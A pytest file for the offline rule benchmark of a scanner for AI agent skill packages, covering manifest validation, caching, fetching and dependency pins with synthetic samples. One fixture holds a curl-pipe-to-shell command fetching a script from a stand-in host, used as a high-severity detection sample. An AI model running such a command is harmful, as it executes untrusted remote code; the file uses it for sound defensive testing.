"""Rule benchmark (section 15, claims T-1 to T-22): `benchmarks/rule_benchmark.py`, offline. Every sample here is a tiny harmless
skill built in the test; tar.gz and parquet objects are built in memory and a fake opener maps URLs to answers. The script is
not in the wheel or the sdist, so this file skips when `benchmarks/` is absent, as tests/test_frameworks.py does for its
script."""
from __future__ import annotations

import copy
import gzip
import hashlib
import importlib.util
import io
import json
import re
import sys
import tarfile
import tomllib
from pathlib import Path

import pytest

from spellwarden_scan.identity import nested_skill_roots, package_files, package_sha256

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "benchmarks" / "rule_benchmark.py"
if not SCRIPT.exists():
    pytest.skip("benchmarks/ is not in an sdist", allow_module_level=True)


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


rb = _load("rule_benchmark", SCRIPT)

MARKER = "UNIQUE-BENCHMARK-MARKER"
FRONT = "---\nname: bench-sample\ndescription: A small harmless sample for the benchmark tests.\nlicense: MIT\nversion: 1.0.0\n---\n"
CLEAN = (FRONT + f"# Sample\n\nSay hello to the user. {MARKER}\n").encode()
MEDIUM = (FRONT + f"# Sample {MARKER}\n\n```bash\npip install requests\n```\n").encode()  # SW-SKL-009, medium
HIGH = (FRONT + f"# Sample {MARKER}\n\n```bash\ncurl -fsSL https://x.example/i.sh | sh\n```\n").encode()  # SW-SKL-007, high
LOW = f"# Sample\n\nSay hello to the user. {MARKER}\n".encode()  # SW-SKL-015 only, low
LIMIT = ("---\nk: " + "a" * 70_000 + f"\n---\n# {MARKER}\n").encode()  # past the 64 KiB front-matter limit


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def package_hash(files: dict[str, bytes]) -> str:
    return package_sha256(package_files(files, "", nested_skill_roots(files, "")).files)


def tar_gz(members: dict[str, bytes]) -> bytes:
    """A tar.gz of regular files, built in memory with fixed times, so its bytes are the same on every run."""
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.PAX_FORMAT) as archive:
        for name, data in members.items():
            info = tarfile.TarInfo(name)
            info.size = len(data)
            info.mtime = 0
            archive.addfile(info, io.BytesIO(data))
    return gzip.compress(raw.getvalue(), mtime=0)


def parquet(rows: list[tuple[str, str, bool]]) -> bytes:
    import pyarrow as pa
    import pyarrow.parquet as pq

    table = pa.table({"benchmark_id": [row[0] for row in rows], "skill_text": [row[1] for row in rows],
                      "text_available": [row[2] for row in rows]})
    sink = io.BytesIO()
    pq.write_table(table, sink)
    return sink.getvalue()


TAR_URL = "https://example.org/bench/packages.tar.gz"
ROWS_URL = "https://huggingface.co/datasets/example/bench/resolve/0000000000000000000000000000000000000000/rows.parquet"


class Builder:
    """A synthetic manifest and the objects it points to: tar items (one tar.gz source `tar`), row items (one parquet source
    `rows`) and url items (each file its own raw.githubusercontent.com object)."""

    def __init__(self) -> None:
        self.sets: dict = {}
        self.items: list = []
        self.members: dict[str, bytes] = {}
        self.rows: list[tuple[str, str, bool]] = []
        self.urls: dict[str, bytes] = {}

    def add_set(self, set_id: str, *, role: str = "test", strata: dict[str, str] | None = None, report: str | None = None) -> None:
        strata = strata or {"m": "malicious", "b": "benign"}
        value = {"title": f"Set {set_id}", "role": role,
                 "strata": {name: {"label": label, "title": f"Stratum {name}"} for name, label in strata.items()}}
        if report is not None:
            value["report"] = report
        self.sets[set_id] = value

    def _item(self, item_id: str, set_id: str, stratum: str, roots: list[dict]) -> dict:
        item = {"id": item_id, "set": set_id, "stratum": stratum, "ref": f"ref:{item_id}", "roots": roots}
        self.items.append(item)
        return item

    def tar_item(self, item_id: str, set_id: str, stratum: str, roots: list[dict[str, bytes]]) -> dict:
        records = []
        for number, files in enumerate(roots, start=1):
            entries = []
            for path, data in sorted(files.items()):
                member = f"packages/{item_id}/r{number}/{path}"
                self.members[member] = data
                entries.append({"path": path, "sha256": sha(data), "bytes": len(data),
                                "from": {"source": "tar", "member": member}})
            records.append({"package_sha256": package_hash(files), "files": entries})
        return self._item(item_id, set_id, stratum, records)

    def row_item(self, item_id: str, set_id: str, stratum: str, text: bytes, *, available: bool = True) -> dict:
        row = f"ROW_{item_id}"
        self.rows.append((row, text.decode("utf-8"), available))
        entry = {"path": "SKILL.md", "sha256": sha(text), "bytes": len(text), "from": {"source": "rows", "row": row}}
        return self._item(item_id, set_id, stratum, [{"package_sha256": package_hash({"SKILL.md": text}), "files": [entry]}])

    def url_item(self, item_id: str, set_id: str, stratum: str, files: dict[str, bytes], *, commit: str = "c" * 40) -> dict:
        entries = []
        for path, data in sorted(files.items()):
            url = f"https://raw.githubusercontent.com/owner/{item_id}/{commit}/skill/{path}"
            self.urls[url] = data
            entries.append({"path": path, "sha256": sha(data), "bytes": len(data), "from": {"url": url}})
        return self._item(item_id, set_id, stratum, [{"package_sha256": package_hash(files), "files": entries}])

    def objects(self) -> dict[str, bytes]:
        """Every object by URL: the two sources (when used) and every url file."""
        found = dict(self.urls)
        if self.members:
            found[TAR_URL] = tar_gz(self.members)
        if self.rows:
            found[ROWS_URL] = parquet(self.rows)
        return found

    def document(self) -> dict:
        objects = self.objects()
        sources = {}
        if self.members:
            data = objects[TAR_URL]
            sources["tar"] = {"url": TAR_URL, "sha256": sha(data), "bytes": len(data), "kind": "tar.gz",
                              "title": "Synthetic packages", "licence": "CC0-1.0"}
        if self.rows:
            data = objects[ROWS_URL]
            sources["rows"] = {"url": ROWS_URL, "sha256": sha(data), "bytes": len(data), "kind": "parquet",
                               "title": "Synthetic rows", "licence": "CC0-1.0"}
        return {"manifest": 1, "name": "spellwarden-rule-benchmark", "built": "2026-11-24", "sources": sources,
                "sets": copy.deepcopy(self.sets), "items": copy.deepcopy(self.items), "excluded": []}

    def fill(self, cache) -> None:
        for data in self.objects().values():
            cache.put(sha(data), data)


class FakeOpener:
    """Maps a URL to an answer: bytes (200), an `rb.Answer`, an exception to raise, or a list of those used in turn."""

    def __init__(self, answers: dict) -> None:
        self.answers = {url: (list(value) if isinstance(value, list) else [value]) for url, value in answers.items()}
        self.calls: list[tuple[str, dict]] = []

    def __call__(self, url: str, headers, _timeout: float, limit: int):
        self.calls.append((url, dict(headers)))
        queue = self.answers.get(url)
        if not queue:
            return rb.Answer(404, None, b"")
        value = queue.pop(0) if len(queue) > 1 else queue[0]
        if isinstance(value, Exception):
            raise value
        if isinstance(value, bytes):
            return rb.Answer(200, None, value[:limit])
        return value


def two_set_builder() -> Builder:
    """A test set and a tuning set: a tar item of two skills, a url item and a clean tar item."""
    builder = Builder()
    builder.add_set("alpha")
    builder.add_set("beta", role="tuning")
    builder.tar_item("m-one", "alpha", "m", [{"SKILL.md": HIGH}, {"SKILL.md": CLEAN, "notes.txt": b"x"}])
    builder.url_item("b-two", "alpha", "b", {"SKILL.md": CLEAN, "README.md": b"# readme\n"})
    builder.tar_item("b-three", "beta", "b", [{"SKILL.md": MEDIUM}])
    return builder


def write_manifest(tmp_path: Path, document: dict, *, newline: str = "\n") -> Path:
    path = tmp_path / "manifest.json"
    text = json.dumps(document, indent=1, sort_keys=True, ensure_ascii=False) + "\n"
    path.write_bytes(text.replace("\n", newline).encode("utf-8"))
    return path


# --- T-1, T-3: the manifest ---------------------------------------------------------------------------------------------------

def test_a_valid_synthetic_manifest_loads_with_its_items_in_id_order(tmp_path):
    manifest = rb.load_manifest(write_manifest(tmp_path, two_set_builder().document()))
    assert [item["id"] for item in manifest.items] == ["b-three", "b-two", "m-one"]
    assert set(manifest.sets) == {"alpha", "beta"} and set(manifest.sources) == {"tar"}
    assert re.fullmatch(r"[0-9a-f]{64}", manifest.sha256)


def _first_file(document: dict, item_id: str) -> dict:
    return next(item for item in document["items"] if item["id"] == item_id)["roots"][0]["files"][0]


def _mutations():
    def repeated_id(d):
        d["items"][1]["id"] = d["items"][0]["id"]
        return d["items"][0]["id"]

    def unknown_stratum(d):
        d["items"][0]["stratum"] = "nowhere"
        return d["items"][0]["id"]

    def bad_label(d):
        d["sets"]["alpha"]["strata"]["m"]["label"] = "suspicious"
        return "alpha"

    def dotdot(d):
        _first_file(d, "m-one")["path"] = "../SKILL.md"
        return "m-one"

    def backslash(d):
        _first_file(d, "m-one")["path"] = "dir\\SKILL.md"
        return "m-one"

    def leading_slash(d):
        _first_file(d, "m-one")["path"] = "/SKILL.md"
        return "m-one"

    def two_kinds(d):
        _first_file(d, "m-one")["from"]["url"] = "https://raw.githubusercontent.com/o/r/" + "a" * 40 + "/SKILL.md"
        return "m-one"

    def no_skill_md(d):
        _first_file(d, "m-one")["path"] = "OTHER.md"
        return "m-one"

    def too_large(d):
        _first_file(d, "m-one")["bytes"] = 2_000_001
        return "m-one"

    def not_https(d):
        d["sources"]["tar"]["url"] = "http://example.org/packages.tar.gz"
        return "tar"

    def short_commit(d):
        _first_file(d, "b-two")["from"]["url"] = "https://raw.githubusercontent.com/o/r/abc123/SKILL.md"
        return "b-two"

    def other_report(d):
        d["sets"]["alpha"]["report"] = "summary"
        return "alpha"

    def extra_member(d):
        d["items"][0]["text"] = "pasted sample text"
        return d["items"][0]["id"]

    def long_string(d):
        d["items"][0]["ref"] = "x" * 401
        return d["items"][0]["id"]

    return [repeated_id, unknown_stratum, bad_label, dotdot, backslash, leading_slash, two_kinds, no_skill_md, too_large,
            not_https, short_commit, other_report, extra_member, long_string]


@pytest.mark.parametrize("mutate", _mutations(), ids=lambda function: function.__name__)
def test_each_broken_manifest_is_refused_naming_the_item_or_the_source(tmp_path, mutate):
    document = two_set_builder().document()
    named = mutate(document)
    with pytest.raises(rb.ManifestError) as raised:
        rb.load_manifest(write_manifest(tmp_path, document))
    assert raised.value.code == "manifest_invalid"
    if mutate.__name__ != "long_string":
        assert named in str(raised.value), str(raised.value)


def _per_item_builder(count: int, *, benign: bool = False) -> Builder:
    builder = Builder()
    builder.add_set("few", strata={"tob": "benign" if benign else "malicious"}, report="per-item")
    for number in range(count):
        builder.tar_item(f"m-few-{number:02d}", "few", "tob", [{"SKILL.md": CLEAN + str(number).encode()}])
    return builder


def test_a_per_item_set_has_at_most_20_items_and_malicious_strata_only(tmp_path):
    rb.load_manifest(write_manifest(tmp_path, _per_item_builder(20).document()))
    with pytest.raises(rb.ManifestError, match="few"):
        rb.load_manifest(write_manifest(tmp_path, _per_item_builder(21).document()))
    with pytest.raises(rb.ManifestError, match="few"):
        rb.load_manifest(write_manifest(tmp_path, _per_item_builder(2, benign=True).document()))


def test_a_package_hash_in_items_of_two_sets_is_refused(tmp_path):
    builder = two_set_builder()
    builder.tar_item("m-again", "beta", "m", [{"SKILL.md": HIGH}])
    with pytest.raises(rb.ManifestError, match="two sets"):
        rb.load_manifest(write_manifest(tmp_path, builder.document()))


def test_inside_one_set_a_shared_root_is_accepted_but_not_the_same_list_or_a_root_twice(tmp_path):
    builder = Builder()
    builder.add_set("alpha")
    builder.tar_item("m-a", "alpha", "m", [{"SKILL.md": HIGH}, {"SKILL.md": MEDIUM}])
    builder.tar_item("m-b", "alpha", "m", [{"SKILL.md": HIGH}, {"SKILL.md": LOW}])
    manifest = rb.load_manifest(write_manifest(tmp_path, builder.document()))
    assert [item["id"] for item in manifest.items] == ["m-a", "m-b"]
    builder.tar_item("m-c", "alpha", "m", [{"SKILL.md": HIGH}, {"SKILL.md": MEDIUM}])
    with pytest.raises(rb.ManifestError, match="m-c"):
        rb.load_manifest(write_manifest(tmp_path, builder.document()))
    twice = Builder()
    twice.add_set("alpha")
    twice.tar_item("m-d", "alpha", "m", [{"SKILL.md": HIGH}, {"SKILL.md": HIGH}])
    with pytest.raises(rb.ManifestError, match="m-d"):
        rb.load_manifest(write_manifest(tmp_path, twice.document()))


def test_an_excluded_record_names_an_existing_set_and_stratum_and_a_date(tmp_path):
    document = two_set_builder().document()
    document["excluded"] = [{"id": "b-gone", "set": "alpha", "stratum": "b", "reason": "repository gone", "date": "2026-11-24"}]
    rb.load_manifest(write_manifest(tmp_path, document))
    document["excluded"][0]["stratum"] = "nowhere"
    with pytest.raises(rb.ManifestError, match="b-gone"):
        rb.load_manifest(write_manifest(tmp_path, document))


def test_a_missing_manifest_is_manifest_missing(tmp_path):
    with pytest.raises(rb.BenchmarkError) as raised:
        rb.load_manifest(tmp_path / "manifest.json")
    assert raised.value.code == "manifest_missing" and "build_manifest.py" in str(raised.value)


def test_sample_hash_is_the_engine_package_hash():
    assert rb.sample_hash({"SKILL.md": CLEAN, "inner/SKILL.md": HIGH}) == package_hash({"SKILL.md": CLEAN, "inner/SKILL.md": HIGH})
    assert rb.sample_hash({"SKILL.md": CLEAN}) != rb.sample_hash({"SKILL.md": MEDIUM})


# --- T-12: the manifest hash does not depend on line endings ------------------------------------------------------------------

def test_the_manifest_hash_is_the_same_with_lf_and_crlf(tmp_path):
    document = two_set_builder().document()
    lf = rb.load_manifest(write_manifest(tmp_path, document)).sha256
    crlf = rb.load_manifest(write_manifest(tmp_path, document, newline="\r\n")).sha256
    assert lf == crlf == rb.manifest_sha256(document)


# --- T-17: the cache ----------------------------------------------------------------------------------------------------------

def test_a_cache_inside_the_repository_is_refused(tmp_path):
    with pytest.raises(rb.BenchmarkError) as raised:
        rb.cache_directory(ROOT / "benchmarks" / "cache", {}, windows=False)
    assert raised.value.code == "cache_in_repository"
    with pytest.raises(rb.BenchmarkError):
        rb.cache_directory(None, {"SPELLWARDEN_BENCHMARK_CACHE": str(ROOT)}, windows=False)
    assert rb.cache_directory(tmp_path / "c", {}, windows=False) == (tmp_path / "c").resolve()


def test_the_default_cache_directory_follows_the_platform(tmp_path):
    assert rb.cache_directory(None, {"LOCALAPPDATA": str(tmp_path)}, windows=True) == (tmp_path / "spellwarden" / "benchmark-cache").resolve()
    assert rb.cache_directory(None, {"XDG_CACHE_HOME": str(tmp_path)}, windows=False) == (tmp_path / "spellwarden" / "benchmark-cache").resolve()
    assert rb.cache_directory(None, {"SPELLWARDEN_BENCHMARK_CACHE": str(tmp_path / "x")}, windows=True) == (tmp_path / "x").resolve()


def test_the_cache_refuses_data_under_another_hash_and_rehashes_what_it_reads(tmp_path):
    cache = rb.Cache(tmp_path / "cache")
    with pytest.raises(ValueError):
        cache.put(sha(b"one"), b"two")
    cache.put(sha(b"one"), b"one")
    assert cache.get(sha(b"one")) == b"one"
    (tmp_path / "cache" / "objects" / sha(b"one")).write_bytes(b"changed")
    assert cache.get(sha(b"one")) is None
    assert [path.name for path in (tmp_path / "cache" / "objects").iterdir()] == [sha(b"one")]


# --- T-4, T-5: fetching -------------------------------------------------------------------------------------------------------

URL = "https://raw.githubusercontent.com/owner/repo/" + "a" * 40 + "/SKILL.md"


def test_an_object_of_the_wrong_length_or_hash_is_refused_and_not_cached(tmp_path):
    cache = rb.Cache(tmp_path / "cache")
    for body in (CLEAN + b"x", CLEAN[:-1], CLEAN[:-1] + b"?"):
        with pytest.raises(rb.FetchFailed) as raised:
            rb.fetch_object(URL, sha(CLEAN), len(CLEAN), cache, opener=FakeOpener({URL: body}), sleep=lambda _: None)
        assert raised.value.code == "fetch_failed" and URL in str(raised.value)
        assert MARKER not in str(raised.value)
    assert not (tmp_path / "cache" / "objects").exists() or not any((tmp_path / "cache" / "objects").iterdir())
    assert rb.fetch_object(URL, sha(CLEAN), len(CLEAN), cache, opener=FakeOpener({URL: CLEAN})) == CLEAN
    assert cache.get(sha(CLEAN)) == CLEAN


def test_404_is_not_tried_again_and_503_is_tried_twice_then_fails(tmp_path):
    cache = rb.Cache(tmp_path / "cache")
    slept: list[float] = []
    missing = FakeOpener({URL: rb.Answer(404, None, b"")})
    with pytest.raises(rb.FetchFailed) as raised:
        rb.fetch_object(URL, sha(CLEAN), len(CLEAN), cache, opener=missing, sleep=slept.append)
    assert len(missing.calls) == 1 and raised.value.status == 404 and slept == []
    busy = FakeOpener({URL: rb.Answer(503, None, b"")})
    with pytest.raises(rb.FetchFailed, match="HTTP 503"):
        rb.fetch_object(URL, sha(CLEAN), len(CLEAN), cache, opener=busy, sleep=slept.append)
    assert len(busy.calls) == 3 and slept == [2, 4]
    flaky = FakeOpener({URL: [TimeoutError(), rb.Answer(429, None, b""), CLEAN]})
    assert rb.fetch_object(URL, sha(CLEAN), len(CLEAN), cache, opener=flaky, sleep=lambda _: None) == CLEAN
    assert len(flaky.calls) == 3


def test_a_redirect_to_http_is_refused(tmp_path):
    opener = FakeOpener({URL: rb.Answer(302, "http://example.org/SKILL.md", b"")})
    with pytest.raises(rb.FetchFailed, match="not https"):
        rb.fetch_object(URL, sha(CLEAN), len(CLEAN), rb.Cache(tmp_path / "cache"), opener=opener, sleep=lambda _: None)


def test_the_token_reaches_only_raw_githubusercontent_and_is_dropped_on_a_redirect_to_another_host(tmp_path):
    storage = "https://storage.example.org/object"
    opener = FakeOpener({URL: rb.Answer(302, storage, b""), storage: CLEAN, TAR_URL: CLEAN})
    cache = rb.Cache(tmp_path / "cache")
    rb.fetch_object(URL, sha(CLEAN), len(CLEAN), cache, opener=opener, token="secret-token")
    assert opener.calls[0][1]["Authorization"] == "Bearer secret-token"
    assert "Authorization" not in opener.calls[1][1]
    assert all(headers["User-Agent"] == rb.USER_AGENT for _, headers in opener.calls)
    other = FakeOpener({TAR_URL: CLEAN})
    rb.fetch_object(TAR_URL, sha(CLEAN), len(CLEAN), rb.Cache(tmp_path / "other"), opener=other, token="secret-token")
    assert "Authorization" not in other.calls[0][1]


def test_fetch_gets_only_what_the_cache_lacks(tmp_path):
    builder = two_set_builder()
    manifest = rb.load_manifest(write_manifest(tmp_path, builder.document()))
    cache = rb.Cache(tmp_path / "cache")
    opener = FakeOpener(builder.objects())
    report = rb.fetch(manifest, cache, opener=opener, offline=False, token=None)
    assert report == rb.FetchReport(needed=3, fetched=3) and len(opener.calls) == 3
    again = FakeOpener(builder.objects())
    assert rb.fetch(manifest, cache, opener=again, offline=False, token=None) == rb.FetchReport(needed=3, fetched=0)
    assert again.calls == []


def test_offline_with_a_missing_object_names_it_and_never_calls_the_opener(tmp_path):
    builder = two_set_builder()
    manifest = rb.load_manifest(write_manifest(tmp_path, builder.document()))
    opener = FakeOpener(builder.objects())
    with pytest.raises(rb.BenchmarkError) as raised:
        rb.fetch(manifest, rb.Cache(tmp_path / "cache"), opener=opener, offline=True, token=None)
    assert raised.value.code == "object_missing" and "source tar" in str(raised.value)
    assert opener.calls == []


def test_a_failed_fetch_names_the_source_or_item(tmp_path):
    builder = two_set_builder()
    manifest = rb.load_manifest(write_manifest(tmp_path, builder.document()))
    objects = builder.objects()
    url = next(url for url in objects if url.startswith("https://raw.githubusercontent.com/") and url.endswith("/README.md"))
    objects[url] = rb.Answer(404, None, b"")
    with pytest.raises(rb.FetchFailed) as raised:
        rb.fetch(manifest, rb.Cache(tmp_path / "cache"), opener=FakeOpener(objects), offline=False, token=None,
                 sleep=lambda _: None)
    assert "item b-two, file README.md" in str(raised.value) and "HTTP 404" in str(raised.value)


# --- T-18: the benchmark's dependencies --------------------------------------------------------------------------------------

def test_the_requirements_pin_only_what_uv_lock_holds_and_pyarrow_is_in_the_benchmark_group():
    text = (ROOT / "benchmarks" / "requirements.txt").read_text(encoding="utf-8")
    locked = {package["name"]: package for package in tomllib.loads((ROOT / "uv.lock").read_text(encoding="utf-8"))["package"]}
    pins = re.findall(r"^([A-Za-z0-9_.-]+)==([^\s\\;]+)", text, re.M)
    assert [name.lower() for name, _ in pins] == ["pyarrow"]
    for name, version in pins:
        package = locked[name.lower()]
        assert version == package["version"], name
        hashes = {entry["hash"] for entry in package.get("wheels", [])} | ({package["sdist"]["hash"]} if "sdist" in package else set())
        pinned = set(re.findall(r"--hash=(sha256:[0-9a-f]{64})", text))
        assert pinned and pinned <= hashes, name
    project = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))
    groups = project["dependency-groups"]
    assert groups["benchmark"] == [f"pyarrow=={locked['pyarrow']['version']}"]
    assert groups["dev"][-1] == {"include-group": "benchmark"}
    assert "benchmarks" in project["tool"]["ruff"]["src"]


def test_the_gate_lints_the_benchmark_and_never_fetches():
    makefile = (ROOT / "Makefile").read_text(encoding="utf-8")
    assert makefile.count("ruff check src tests benchmarks") == 2
    assert "rule_benchmark.py run" in makefile.split("\nbenchmark:", 1)[1]
    check = makefile.split("\ncheck:", 1)[1].split("\n\n", 1)[0]
    assert "rule_benchmark" not in check
    workflow = (ROOT / ".github" / "workflows" / "check.yml").read_text(encoding="utf-8")
    assert "uv run --locked ruff check src tests benchmarks" in workflow
